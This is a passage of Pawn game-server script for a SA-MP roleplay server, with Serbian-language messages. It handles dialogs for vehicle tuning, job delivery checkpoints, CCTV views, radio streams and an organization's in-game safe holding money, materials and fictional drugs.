	                    if( TPInfo[ playerid ][ tID ] == -1 ) return SendErrorMessage( playerid, "Nema kompatibilnih komponenti izabrane vrste za vas model auta." );

						new cid = TPInfo[ playerid ][ tID ];
						TPInfo[ playerid ][ tType ] = CARMODTYPE_ROOF;
						TPInfo[ playerid ][ tPaintjob ] = false;

	                    TogglePlayerControllable( playerid, false );
	                    TuningTDShow( playerid, true );

                        PlayerTextDrawSetString( playerid, TuningBuy[ playerid ][ 1 ], "Roof" );
	                    format( globalstring, sizeof( globalstring ), "%s", cInfo[ cid ][ cName ] );
						PlayerTextDrawSetString( playerid, TuningBuy[ playerid ][ 3 ], globalstring );
						format( globalstring, sizeof( globalstring ), "%s", GetVehicleNameEx( GetVehicleModel( vehicleid ) ) );
						PlayerTextDrawSetString( playerid, TuningBuy[ playerid ][ 4 ], globalstring );

                        AddVehicleComponent( vehicleid, cInfo[ cid ][ cID ] );

						GetVehicleCameraPos( vehicleid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ], 0, 6, 2 ); // done
						SetPlayerCameraPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );

						GetVehiclePos( vehicleid, Pos[ 0 ],Pos[ 1 ],Pos[ 2 ] );
						SetPlayerCameraLookAt( playerid, Pos[ 0 ],Pos[ 1 ],Pos[ 2 ] );

						SelectTextDraw( playerid, SRVBOJA1 );
	                }
	                case 6: {

	                    for( new i = 0; i < MAX_COMPONENTS; i++ ) {
			                if( cInfo[ i ][ cType ] == CARMODTYPE_SPOILER ) {
			                    if( cInfo[ i ][ cID ] == IsComponentidCompatible( GetVehicleModel( vehicleid ), cInfo[ i ][ cID ] ) ) {
				                    TPInfo[ playerid ][ tID ] = i;
									break;
								}
			                }
						}
	                    if( TPInfo[ playerid ][ tID ] == -1 ) return SendErrorMessage( playerid, "Nema kompatibilnih komponenti izabrane vrste za vas model auta." );

						new cid = TPInfo[ playerid ][ tID ];
						TPInfo[ playerid ][ tType ] = CARMODTYPE_SPOILER;
						TPInfo[ playerid ][ tPaintjob ] = false;

	                    TogglePlayerControllable( playerid, false );
	                    TuningTDShow( playerid, true );

                        PlayerTextDrawSetString( playerid, TuningBuy[ playerid ][ 1 ], "Spoilers" );
	                    format( globalstring, sizeof( globalstring ), "%s", cInfo[ cid ][ cName ] );
						PlayerTextDrawSetString( playerid, TuningBuy[ playerid ][ 3 ], globalstring );
						format( globalstring, sizeof( globalstring ), "%s", GetVehicleNameEx( GetVehicleModel( vehicleid ) ) );
						PlayerTextDrawSetString( playerid, TuningBuy[ playerid ][ 4 ], globalstring );

                        AddVehicleComponent( vehicleid, cInfo[ cid ][ cID ] );

						GetVehicleCameraPos( vehicleid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ], 0, -6, 2 ); // done
						SetPlayerCameraPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );

						GetVehiclePos( vehicleid, Pos[ 0 ],Pos[ 1 ],Pos[ 2 ] );
						SetPlayerCameraLookAt( playerid, Pos[ 0 ],Pos[ 1 ],Pos[ 2 ] );

						SelectTextDraw( playerid, SRVBOJA1 );
	                }
	                case 7: {

	                    for( new i = 0; i < MAX_COMPONENTS; i++ ) {
			                if( cInfo[ i ][ cType ] == CARMODTYPE_SIDESKIRT ) {
			                    if( cInfo[ i ][ cID ] == IsComponentidCompatible( GetVehicleModel( vehicleid ), cInfo[ i ][ cID ] ) ) {
				                    TPInfo[ playerid ][ tID ] = i;
									break;
								}
			                }
						}
	                    if( TPInfo[ playerid ][ tID ] == -1 ) return SendErrorMessage( playerid, "Nema kompatibilnih komponenti izabrane vrste za vas model auta." );

						new cid = TPInfo[ playerid ][ tID ];
						TPInfo[ playerid ][ tType ] = CARMODTYPE_SIDESKIRT;
						TPInfo[ playerid ][ tPaintjob ] = false;

	                    TogglePlayerControllable( playerid, false );
	                    TuningTDShow( playerid, true );

                        PlayerTextDrawSetString( playerid, TuningBuy[ playerid ][ 1 ], "Side Skirts" );
	                    format( globalstring, sizeof( globalstring ), "%s", cInfo[ cid ][ cName ] );
						PlayerTextDrawSetString( playerid, TuningBuy[ playerid ][ 3 ], globalstring );
						format( globalstring, sizeof( globalstring ), "%s", GetVehicleNameEx( GetVehicleModel( vehicleid ) ) );
						PlayerTextDrawSetString( playerid, TuningBuy[ playerid ][ 4 ], globalstring );

                        AddVehicleComponent( vehicleid, cInfo[ cid ][ cID ] );

						GetVehicleCameraPos( vehicleid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ], 4, 0, 0.5 );
						SetPlayerCameraPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );

						GetVehiclePos( vehicleid, Pos[ 0 ],Pos[ 1 ],Pos[ 2 ] );
						SetPlayerCameraLookAt( playerid, Pos[ 0 ],Pos[ 1 ],Pos[ 2 ] );

						SelectTextDraw( playerid, SRVBOJA1 );
	                }
	                case 8: {

	                    for( new i = 0; i < MAX_COMPONENTS; i++ ) {
			                if( cInfo[ i ][ cType ] == CARMODTYPE_WHEELS ) {
			                    if( cInfo[ i ][ cID ] == IsComponentidCompatible( GetVehicleModel( vehicleid ), cInfo[ i ][ cID ] ) ) {
				                    TPInfo[ playerid ][ tID ] = i;
									break;
								}
			                }
						}
	                    if( TPInfo[ playerid ][ tID ] == -1 ) return SendErrorMessage( playerid, "Nema kompatibilnih komponenti izabrane vrste za vas model auta." );

						new cid = TPInfo[ playerid ][ tID ];
						TPInfo[ playerid ][ tType ] = CARMODTYPE_WHEELS;
						TPInfo[ playerid ][ tPaintjob ] = false;

	                    TogglePlayerControllable( playerid, false );
	                    TuningTDShow( playerid, true );

                        PlayerTextDrawSetString( playerid, TuningBuy[ playerid ][ 1 ], "Wheels" );
	                    format( globalstring, sizeof( globalstring ), "%s", cInfo[ cid ][ cName ] );
						PlayerTextDrawSetString( playerid, TuningBuy[ playerid ][ 3 ], globalstring );
						format( globalstring, sizeof( globalstring ), "%s", GetVehicleNameEx( GetVehicleModel( vehicleid ) ) );
						PlayerTextDrawSetString( playerid, TuningBuy[ playerid ][ 4 ], globalstring );

                        AddVehicleComponent( vehicleid, cInfo[ cid ][ cID ] );

						GetVehicleCameraPos( vehicleid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ], 4, 0, 0.5 ); // done
						SetPlayerCameraPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );

						GetVehiclePos( vehicleid, Pos[ 0 ],Pos[ 1 ],Pos[ 2 ] );
						SetPlayerCameraLookAt( playerid, Pos[ 0 ],Pos[ 1 ],Pos[ 2 ] );

						SelectTextDraw( playerid, SRVBOJA1 );
	                }
	                case 9: {

	                    for( new i = 0; i < MAX_COMPONENTS; i++ ) {
			                if( cInfo[ i ][ cType ] == CARMODTYPE_STEREO ) {
			                    if( cInfo[ i ][ cID ] == IsComponentidCompatible( GetVehicleModel( vehicleid ), cInfo[ i ][ cID ] ) ) {
				                    TPInfo[ playerid ][ tID ] = i;
									break;
								}
			                }
						}
	                    if( TPInfo[ playerid ][ tID ] == -1 ) return SendErrorMessage( playerid, "Nema kompatibilnih komponenti izabrane vrste za vas model auta." );

						new cid = TPInfo[ playerid ][ tID ];
						TPInfo[ playerid ][ tType ] = CARMODTYPE_STEREO;
						TPInfo[ playerid ][ tPaintjob ] = false;

	                    TogglePlayerControllable( playerid, false );
	                    TuningTDShow( playerid, true );

                        PlayerTextDrawSetString( playerid, TuningBuy[ playerid ][ 1 ], "Car Stereo" );
	                    format( globalstring, sizeof( globalstring ), "%s", cInfo[ cid ][ cName ] );
						PlayerTextDrawSetString( playerid, TuningBuy[ playerid ][ 3 ], globalstring );
						format( globalstring, sizeof( globalstring ), "%s", GetVehicleNameEx( GetVehicleModel( vehicleid ) ) );
						PlayerTextDrawSetString( playerid, TuningBuy[ playerid ][ 4 ], globalstring );

                        AddVehicleComponent( vehicleid, cInfo[ cid ][ cID ] );

						GetVehicleCameraPos( vehicleid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ], 0, -6, 2 );
						SetPlayerCameraPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );

						GetVehiclePos( vehicleid, Pos[ 0 ],Pos[ 1 ],Pos[ 2 ] );
						SetPlayerCameraLookAt( playerid, Pos[ 0 ],Pos[ 1 ],Pos[ 2 ] );

						SelectTextDraw( playerid, SRVBOJA1 );
	                }
	                case 10: {

	                    for( new i = 0; i < MAX_COMPONENTS; i++ ) {
			                if( cInfo[ i ][ cType ] == CARMODTYPE_HYDRAULICS ) {
			                    if( cInfo[ i ][ cID ] == IsComponentidCompatible( GetVehicleModel( vehicleid ), cInfo[ i ][ cID ] ) ) {
				                    TPInfo[ playerid ][ tID ] = i;
									break;
								}
			                }
						}
	                    if( TPInfo[ playerid ][ tID ] == -1 ) return SendErrorMessage( playerid, "Nema kompatibilnih komponenti izabrane vrste za vas model auta." );

						new cid = TPInfo[ playerid ][ tID ];
						TPInfo[ playerid ][ tType ] = CARMODTYPE_HYDRAULICS;
						TPInfo[ playerid ][ tPaintjob ] = false;

	                    TogglePlayerControllable( playerid, false );
	                    TuningTDShow( playerid, true );

                        PlayerTextDrawSetString( playerid, TuningBuy[ playerid ][ 1 ], "Hydraulics" );
	                    format( globalstring, sizeof( globalstring ), "%s", cInfo[ cid ][ cName ] );
						PlayerTextDrawSetString( playerid, TuningBuy[ playerid ][ 3 ], globalstring );
						format( globalstring, sizeof( globalstring ), "%s", GetVehicleNameEx( GetVehicleModel( vehicleid ) ) );
						PlayerTextDrawSetString( playerid, TuningBuy[ playerid ][ 4 ], globalstring );

                        AddVehicleComponent( vehicleid, cInfo[ cid ][ cID ] );

						GetVehicleCameraPos( vehicleid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ], 2, 2, 2 );
						SetPlayerCameraPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );

						GetVehiclePos( vehicleid, Pos[ 0 ],Pos[ 1 ],Pos[ 2 ] );
						SetPlayerCameraLookAt( playerid, Pos[ 0 ],Pos[ 1 ],Pos[ 2 ] );

						SelectTextDraw( playerid, SRVBOJA1 );
	                }
	                case 11: {

	                    for( new i = 0; i < MAX_COMPONENTS; i++ ) {
			                if( cInfo[ i ][ cType ] == CARMODTYPE_NITRO ) {
			                    if( cInfo[ i ][ cID ] == IsComponentidCompatible( GetVehicleModel( vehicleid ), cInfo[ i ][ cID ] ) ) {
				                    TPInfo[ playerid ][ tID ] = i;
									break;
								}
			                }
						}
	                    if( TPInfo[ playerid ][ tID ] == -1 ) return SendErrorMessage( playerid, "Nema kompatibilnih komponenti izabrane vrste za vas model auta." );

						new cid = TPInfo[ playerid ][ tID ];
						TPInfo[ playerid ][ tType ] = CARMODTYPE_NITRO;
						TPInfo[ playerid ][ tPaintjob ] = false;

	                    TogglePlayerControllable( playerid, false );
	                    TuningTDShow( playerid, true );

                        PlayerTextDrawSetString( playerid, TuningBuy[ playerid ][ 1 ], "Nitro" );
	                    format( globalstring, sizeof( globalstring ), "%s", cInfo[ cid ][ cName ] );
						PlayerTextDrawSetString( playerid, TuningBuy[ playerid ][ 3 ], globalstring );
						format( globalstring, sizeof( globalstring ), "%s", GetVehicleNameEx( GetVehicleModel( vehicleid ) ) );
						PlayerTextDrawSetString( playerid, TuningBuy[ playerid ][ 4 ], globalstring );

                        AddVehicleComponent( vehicleid, cInfo[ cid ][ cID ] );

						GetVehicleCameraPos( vehicleid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ], 0, -6, 2 ); // done
						SetPlayerCameraPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );

						GetVehiclePos( vehicleid, Pos[ 0 ],Pos[ 1 ],Pos[ 2 ] );
						SetPlayerCameraLookAt( playerid, Pos[ 0 ],Pos[ 1 ],Pos[ 2 ] );

						SelectTextDraw( playerid, SRVBOJA1 );
	                }
	            }
	        }
	        else if( !response ) {
	            SetCameraBehindPlayer( playerid );
	            TuningTDControl( playerid, false );
	            PlayerTuningCar[ playerid ] = false;
	        }
    }
    else if( dialogid == dialog_TUNING_2 ) {
	        if( !response ) return 1;
			if( response ) {
			    if( !IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Morate biti u vozilu." );
	            if( GetPlayerState( playerid ) != PLAYER_STATE_DRIVER ) return SendErrorMessage( playerid, "Morate biti na mestu vozaca." );
				new vehicleid = GetPlayerVehicleID( playerid );
			    new b1, b2;
			    if( sscanf( inputtext, "ii", b1, b2 ) ) return SPD( playerid, dialog_TUNING_2, DSI, D_NASLOV, "Unesi id boje 1 i id boje 2 boje koje zelis za svoje auto.\nFormat:0 1", D_ODABERI, D_ODUSTANI );
				if( b1 < 0 || b2 < 0 || b1 > 255 || b2 > 255 ) return SendErrorMessage( playerid, "ID boje ne moze biti manji od 0 ili veci od 255!");

				ChangeVehicleColor( vehicleid, b1, b2 );

				SPD( playerid, dialog_TUNING, DSL, D_NASLOV, "Paintjobs\nColors\nExhausts\nFront Bumper\nRear Bumper\nRoof\nSpoilers\nSide Skirts\nWheels\nCar Stereo\nHydraulics\nNitro", D_ODABERI, D_ODUSTANI );
			}
	}
	else if( dialogid == dialog_BIRAJLOKACIJU ) { 
	    if( !response ) return true;
		if( response ) {
		    switch( listitem ) {
		        case 0: {
		            Novi_SetPlayerCheckpoint( playerid, -569.0004, -93.3358, 63.9587, 5.0 );
					CheckpointStatus[ playerid ] = 15;
					SendJobMessage( playerid, "Oznacena vam je lokacija utovara drveca." );
		        }
		        case 1: {
		            Novi_SetPlayerCheckpoint( playerid, 2482.1101, -2081.8760, 14.5476, 5.0 );
					CheckpointStatus[ playerid ] = 15;
					SendJobMessage( playerid, "Oznacena vam je lokacija utovara goriva." );
		        }
		        case 2: {
		            Novi_SetPlayerCheckpoint( playerid, 620.8951, 832.1742, -42.9609, 5.0 );
					CheckpointStatus[ playerid ] = 15;
					SendJobMessage( playerid, "Oznacena vam je lokacija utovara sljunka." );
		        }
		        case 3: {
		            Novi_SetPlayerCheckpoint( playerid, -1061.3091, -1195.5011, 129.7787, 5.0 );
					CheckpointStatus[ playerid ] = 15;
					SendJobMessage( playerid, "Oznacena vam je lokacija utovara pamuka." );
		        }
		        case 4: {
		            Novi_SetPlayerCheckpoint( playerid, 1054.8197, 2148.1167, 10.8203, 5.0 );
					CheckpointStatus[ playerid ] = 15;
					SendJobMessage( playerid, "Oznacena vam je lokacija utovara baruta." );
		        }
		        case 5: {
		            Novi_SetPlayerCheckpoint( playerid, 1918.5342, 172.9674, 37.2623, 5.0 );
					CheckpointStatus[ playerid ] = 15;
					SendJobMessage( playerid, "Oznacena vam je lokacija utovara hrane." );
		        }
		        case 6: {
		            Novi_SetPlayerCheckpoint( playerid, 1938.3569, 165.5013, 37.2813, 5.0 );
					CheckpointStatus[ playerid ] = 15;
					SendJobMessage( playerid, "Oznacena vam je lokacija utovara mesa." );
		        }
		        case 7: {
		            Novi_SetPlayerCheckpoint( playerid, 1546.8782, 29.7848, 24.1406, 5.0 );
					CheckpointStatus[ playerid ] = 15;
					SendJobMessage( playerid, "Oznacena vam je lokacija utovara jaja." );
		        }
		        case 8: {
		            Novi_SetPlayerCheckpoint( playerid, 1324.3235, 286.0972, 20.0452, 5.0 );
					CheckpointStatus[ playerid ] = 15;
					SendJobMessage( playerid, "Oznacena vam je lokacija utovara pica." );
		        }
		    }
		}
	}
	else if( dialogid == dialog_VERIFIKACIJA ) {
		if( !response ) return true;
		if( response ) {
		    if( PlayerCode[ playerid ] == strval( inputtext ) && !isnull( inputtext ) ) {
				SendInfoMessage( playerid, "Vas account je verifikovan, sada mozete pokrenuti posao." );
				AccountVerified[ playerid ] = true;
		    }
		    else return SendErrorMessage( playerid, "Uneli ste pogresan kod." );
		}
	}
	else if( dialogid == dialog_CCTV ) {
		if( !response ) return true;
		if( response ) {
			switch( listitem ) {
				case 0: {
					SetPlayerPos( playerid, 1492.2963, -1022.7849, -100.0 );
        			SetPlayerCameraPos( playerid, 1492.2963, -1022.7849, 32.1062 );
        			SetPlayerCameraLookAt( playerid, 1491.3254, -1023.0229, 31.7661 );
        			SetPlayerInterior( playerid, 0 );
        			SetPlayerVirtualWorld( playerid, 0 );
				}
				case 1: {
					SetPlayerPos( playerid, 1810.1304, -1234.1027, -100.0 );
        			SetPlayerCameraPos( playerid, 1810.1304, -1234.1027, 68.2777 );
        			SetPlayerCameraLookAt( playerid, 1811.1062, -1233.8708, 67.8378 );
        			SetPlayerInterior( playerid, 0 );
        			SetPlayerVirtualWorld( playerid, 0 );
				}
				case 2: {
					SetPlayerPos( playerid, 1829.7693, -1210.4064, -100.0 );
        			SetPlayerCameraPos( playerid, 1829.7693, -1210.4064, 70.8133 );
        			SetPlayerCameraLookAt( playerid, 1829.3317, -1211.3047, 70.3782 );
        			SetPlayerInterior( playerid, 0 );
        			SetPlayerVirtualWorld( playerid, 0 );
				}
				case 3: {
					SetPlayerPos( playerid, 1829.5350, -1238.6161, -100.0 );
        			SetPlayerCameraPos( playerid, 1829.5350, -1238.6161, 71.2610 );
        			SetPlayerCameraLookAt( playerid, 1829.1722, -1237.6848, 70.8008 );
        			SetPlayerInterior( playerid, 0 );
        			SetPlayerVirtualWorld( playerid, 0 );
				}
				case 4: {
					SetPlayerPos( playerid, 1801.9082, -1212.8043, -100.0 );
        			SetPlayerCameraPos( playerid, 1801.9082, -1212.8043, 65.8913 );
        			SetPlayerCameraLookAt( playerid, 1801.2021, -1213.5159, 65.6614 );
        			SetPlayerInterior( playerid, 0 );
        			SetPlayerVirtualWorld( playerid, 0 );
				}
			}
		}
	}
	else if( dialogid == dialog_RADIOPLAY ) {
		if( !response ) return true;
		if( response ) {
		    switch( listitem ) {
		        case 0: {
		            StopAudioStreamForPlayer( playerid );
		            PlayAudioStreamForPlayer( playerid, "https://naxi128.streaming.rs:9152/;*.mp3" );
		            SendInfoMessage( playerid, "Pustili ste Naxi radio." );
		        }
		        case 1: {
		            StopAudioStreamForPlayer( playerid );
		            PlayAudioStreamForPlayer( playerid, "https://streaming.tdiradio.com/tdiradio.mp3" );
		            SendInfoMessage( playerid, "Pustili ste TDI radio." );
		        }
		        case 2: {
		            StopAudioStreamForPlayer( playerid );
		            PlayAudioStreamForPlayer( playerid, "https://live.coolradio.rs/cool128" );
		            SendInfoMessage( playerid, "Pustili ste Cool radio." );
		        }
		        case 3: {
		            StopAudioStreamForPlayer( playerid );
		            PlayAudioStreamForPlayer( playerid, "https://stream.playradio.rs:8443/play.mp3" );
		            SendInfoMessage( playerid, "Pustili ste Play radio." );
		        }
		        case 4: {
		            StopAudioStreamForPlayer( playerid );
		            PlayAudioStreamForPlayer( playerid, "https://main.radiokosava.rs/stream" );
		            SendInfoMessage( playerid, "Pustili ste Radio Kosava." );
		        }
		        case 5: {
		            StopAudioStreamForPlayer( playerid );
		            SendInfoMessage( playerid, "Ugasili ste radio." );
		        }
			}
		}
	}
	else if( dialogid == dialog_ORGSAFE ) {
		if( !response ) return true;
		if( response ) {
		    switch( listitem ) {
		        case 0: {
		            new OrgID = PlayerInfo[ playerid ][ xClan ],
						drug1 = OI[ OrgID ][ oSafeDrugCode ][ 0 ],
						drug2 = OI[ OrgID ][ oSafeDrugCode ][ 1 ],
						drug3 = OI[ OrgID ][ oSafeDrugCode ][ 2 ],
						drug4 = OI[ OrgID ][ oSafeDrugCode ][ 3 ];

	                strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
	                strcat( DialogStrgEx, ""col_crvena"__________________________"col_white"__________________________\n");
	                
	                format( globalstring, sizeof( globalstring ), "Novac: %d$\n", OI[ OrgID ][ oSafeMoney ] );
	               	strcat( DialogStrgEx, globalstring );

                    strcat( DialogStrgEx, ""col_crvena"__________________________"col_white"__________________________\n");
                    
                    format( globalstring, sizeof( globalstring ), "Materijali: %d\n", OI[ OrgID ][ oMaterijali ] );
                    strcat( DialogStrgEx, globalstring );
	                
	                strcat( DialogStrgEx, ""col_crvena"__________________________"col_white"__________________________\n");
	                format( globalstring, sizeof( globalstring ), "Drug1: %s(%d g) | Drug2: %s(%d g)\n", GetDrugNameByDrugID(drug1), OI[ OrgID ][ oSafeDrug ][ 0 ], GetDrugNameByDrugID(drug2), OI[ OrgID ][ oSafeDrug ][ 1 ] );
	               	strcat( DialogStrgEx, globalstring );

	               	format( globalstring, sizeof( globalstring ), "Drug3: %s(%d g) | Drug4: %s(%d g)\n", GetDrugNameByDrugID(drug3), OI[ OrgID ][ oSafeDrug ][ 2 ], GetDrugNameByDrugID(drug4), OI[ OrgID ][ oSafeDrug ][ 3 ] );
	               	strcat( DialogStrgEx, globalstring );
	               	
                    strcat( DialogStrgEx, ""col_crvena"__________________________"col_white"__________________________\n");
	               	SPD( playerid, 0, DSMSG, D_NASLOV, DialogStrgEx, "Potvrdi", "" );
	    			strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
		        }
		        case 1: {
		            SPD( playerid, dialog_ORGSAFEPUT, DIALOG_STYLE_LIST, "Izaberi sta zelis da ostavis?", "Novac\nDroga\nMaterijali", "Potvrdi", "Odustani");
		        }
		        case 2: {
		            if( PlayerInfo[ playerid ][ xAdmin ] > 5 || PlayerInfo[ playerid ][ xSkriptaRank ] == 4  ) {
		                SPD( playerid, dialog_ORGSAFETAKE, DIALOG_STYLE_LIST, "Izaberi sta zelis da uzmes?", "Novac\nDroga\nMaterijali", "Potvrdi", "Odustani" );
                    }
                    else return SendErrorMessage(playerid, "Ovo mogu samo admini i vodja lidera!");
		        }
		    }
	    }
	}
	else if( dialogid == dialog_ORGSAFEPUT ) {

        if(!response) return 0;
        if(response) {

            if(listitem == 0) return SPD( playerid, dialog_ORGSAFEPMONEY, DSI, D_NASLOV,  "Unesite koliko novca zelite da ostavite.", D_ODABERI, D_ODUSTANI );
            if(listitem == 1) return SPD( playerid, dialog_ORGSAFEPDRUG, DSI, D_NASLOV,  "Unesite slot droge kod igraca i kolicinu droge za ostavljanje.\nPrimer: 1 232.", D_ODABERI, D_ODUSTANI );
            if(listitem == 2) return SPD( playerid, dialog_ORGSAFEPMATS, DSI, D_NASLOV,  "Unesite koliko materijala zelite da ostavite.", D_ODABERI, D_ODUSTANI );
        }
	}
	else if( dialogid == dialog_ORGSAFETAKE ) {

        if(!response) return 0;
        if(response) {

            if(listitem == 0) return SPD( playerid, dialog_ORGSAFETMONEY, DSI, D_NASLOV,  "Unesite koliko novca zelite da uzmete iz sefa.", D_ODABERI, D_ODUSTANI );
            if(listitem == 1) {

                new drugname1[ 32 ], drugname2[ 32 ], drugname3[ 32 ], drugname4[ 32 ], OrgID = PlayerInfo[ playerid ][ xClan ];
                if( OI[ OrgID ][ oSafeDrugCode ][ 0 ] == 0 && OI[ OrgID ][ oSafeDrugCode ][ 1 ] == 0 && OI[ OrgID ][ oSafeDrugCode ][ 2 ] == 0 && OI[ OrgID ][ oSafeDrugCode ][ 3 ] == 0 ) return SendErrorMessage( playerid, "Svi slotovi droge su prazni!");

                if( OI[ OrgID ][ oSafeDrugCode ][ 0 ] != 0 )
                    format( drugname1, sizeof( drugname1 ), "%s", GetDrugNameByDrugID( OI[ OrgID ][ oSafeDrugCode ][ 0 ] ) );
                else
                    format( drugname1, sizeof( drugname1 ), "None" );

                if( OI[ OrgID ][ oSafeDrugCode ][ 1 ] != 0 )
                    format( drugname2, sizeof( drugname2 ), "%s", GetDrugNameByDrugID( OI[ OrgID ][ oSafeDrugCode ][ 1 ] ) );
                else
                    format( drugname2, sizeof( drugname2 ), "None" );

                if( OI[ OrgID ][ oSafeDrugCode ][ 2 ] != 0 )
                    format( drugname3, sizeof( drugname3 ), "%s", GetDrugNameByDrugID( OI[ OrgID ][ oSafeDrugCode ][ 2 ] ) );
                else
                    format( drugname3, sizeof( drugname3 ), "None" );
                    
                if( OI[ OrgID ][ oSafeDrugCode ][ 3 ] != 0 )
                    format( drugname4, sizeof( drugname4 ), "%s", GetDrugNameByDrugID( OI[ OrgID ][ oSafeDrugCode ][ 3 ] ) );
                else
                    format( drugname4, sizeof( drugname4 ), "None" );
                    
                new string[ 256 ];
                format( string, sizeof( string ), "1. %s\n2. %s\n3. %s\n4. %s\nUnesite slot droge u sefu i kolicinu droge za uzimanje.\nPrimer: 1 232", drugname1, drugname2, drugname3, drugname4 );
                SPD( playerid, dialog_ORGSAFETDRUG, DSI, D_NASLOV, string, D_ODABERI, D_ODUSTANI );
            }
            if(listitem == 2) return SPD( playerid, dialog_ORGSAFETMATS, DSI, D_NASLOV,  "Unesite koliko materijala zelite da uzmete iz sefa.", D_ODABERI, D_ODUSTANI );
        }
	}
	else if( dialogid == dialog_ORGSAFETDRUG ) {
	    if( !response ) return 1;
		if( response ) {

			new slot, slot2, kolicina, OrgID = PlayerInfo[ playerid ][ xClan ];
            if(PlayerInfo[playerid][xLider] != OrgID) return SendErrorMessage(playerid, "Samo lideri!");
			if( sscanf( inputtext, "dd", slot, kolicina ) ) {
			
            	new drugname1[ 32 ], drugname2[ 32 ], drugname3[ 32 ], drugname4[ 32 ];
            	
				if( OI[ OrgID ][ oSafeDrugCode ][ 0 ] != 0 )
					format( drugname1, sizeof( drugname1 ), "%s", GetDrugNameByDrugID( OI[ OrgID ][ oSafeDrugCode ][ 0 ] ) );
				else
				    format( drugname1, sizeof( drugname1 ), "None" );

				if( OI[ OrgID ][ oSafeDrugCode ][ 1 ] != 0 )
				    format( drugname2, sizeof( drugname2 ), "%s", GetDrugNameByDrugID( OI[ OrgID ][ oSafeDrugCode ][ 1 ] ) );
				else
				    format( drugname2, sizeof( drugname2 ), "None" );

			    if( OI[ OrgID ][ oSafeDrugCode ][ 2 ] != 0 )
				    format( drugname3, sizeof( drugname3 ), "%s", GetDrugNameByDrugID( OI[ OrgID ][ oSafeDrugCode ][ 2 ] ) );
				else
				    format( drugname3, sizeof( drugname3 ), "None" );

	            if( OI[ OrgID ][ oSafeDrugCode ][ 3 ] != 0 )
				    format( drugname4, sizeof( drugname4 ), "%s", GetDrugNameByDrugID( OI[ OrgID ][ oSafeDrugCode ][ 3 ] ) );
				else
				    format( drugname4, sizeof( drugname4 ), "None" );

				new string[ 256 ];
			    format( string, sizeof( string ), "1. %s\n2. %s\n3. %s\n4. %s\nUnesite slot droge u sefu i kolicinu droge za uzimanje.\nPrimer: 1 232", drugname1, drugname2, drugname3, drugname4 );
				SPD( playerid, dialog_ORGSAFETDRUG, DSL, D_NASLOV, string, D_ODABERI, D_ODUSTANI );
				
				return 1;
			}

		   	if( slot < 1 || slot > 4 ) return SendErrorMessage( playerid, "Krivi broj slota!");
			slot2 = slot-1;
			if( OI[ OrgID ][ oSafeDrugCode ][ slot2 ] == 0 ) return SendErrorMessage( playerid, "Ovaj sef nema drogu pod tim slotom!");
	       	if( kolicina < 1 || kolicina > OI[ OrgID ][ oSafeDrug ][ slot2 ] ) return SendErrorMessage( playerid, "Ovaj sef nema toliko droge pod tim slotom!");

			OI[ OrgID ][ oSafeDrug ][ slot2 ] -= kolicina;
			format( globalstring, sizeof( globalstring ), "* %s uzima nesto iz sefa.", ImeIgraca( playerid ) );
			PorukaRadius( 10.0, playerid, globalstring, LJUBICASTA );
			SendClientMessageEx( playerid, SRVBOJA1, "%s | Uzeli ste %d grama %s iz sefa.", OI[ OrgID ][ oPreFix ], kolicina, GetDrugNameByDrugID( OI[ OrgID ][ oSafeDrugCode ][ slot2 ] ) );

			if( PlayerInfo[ playerid ][ xDrugCode ][ 0 ] == 0 ) {
			    PlayerInfo[ playerid ][ xDrugCode ][ 0 ] = OI[ OrgID ][ oSafeDrugCode ][ slot2 ];
			    PlayerInfo[ playerid ][ xDrug ][ 0 ] = kolicina;
			}
			else if( PlayerInfo[ playerid ][ xDrugCode ][ 1 ] == 0 ) {
			    PlayerInfo[ playerid ][ xDrugCode ][ 1 ] = OI[ OrgID ][ oSafeDrugCode ][ slot2 ];
			    PlayerInfo[ playerid ][ xDrug ][ 1 ] = kolicina;
			}
			else if( PlayerInfo[ playerid ][ xDrugCode ][ 2 ] == 0 ) {
			    PlayerInfo[ playerid ][ xDrugCode ][ 2 ] = OI[ OrgID ][ oSafeDrugCode ][ slot2 ];
			    PlayerInfo[ playerid ][ xDrug ][ 2 ] = kolicina;
			}
			else if( PlayerInfo[ playerid ][ xDrugCode ][ 3 ] == 0 ) {
			    PlayerInfo[ playerid ][ xDrugCode ][ 3 ] = OI[ OrgID ][ oSafeDrugCode ][ slot2 ];
			    PlayerInfo[ playerid ][ xDrug ][ 3 ] = kolicina;
			}
			else if( PlayerInfo[ playerid ][ xDrugCode ][ 4 ] == 0 ) {
			    PlayerInfo[ playerid ][ xDrugCode ][ 4 ] = OI[ OrgID ][ oSafeDrugCode ][ slot2 ];
			    PlayerInfo[ playerid ][ xDrug ][ 4 ] = kolicina;
			}

			if( OI[ OrgID ][ oSafeDrug ][ slot2 ] <= 0 )
			    OI[ OrgID ][ oSafeDrugCode ][ slot2 ] = 0;
			    
			SaveOrganization( OrgID );
		}
	}
	else if( dialogid == dialog_ORGSAFEPDRUG ) {
	    if( !response ) return 1;
		if( response ) {
		    new slot, slot2, kolicina, OrgID = PlayerInfo[ playerid ][ xClan ];
		    if( sscanf( inputtext, "dd", slot, kolicina ) ) return SPD( playerid, dialog_ORGSAFEPDRUG, DSI, D_NASLOV,  "Unesite slot droge kod igraca i kolicinu droge za ostavljanje.\nPrimer: 1 232.", D_ODABERI, D_ODUSTANI );

            if( slot < 1 || slot > 5 ) return SendErrorMessage( playerid, "Krivi broj slota!");
			slot2 = slot-1;
		    if( PlayerInfo[ playerid ][ xDrugCode ][ slot2 ] == 0 ) return SendErrorMessage( playerid, "Nemate droge pod tim slotom!" );
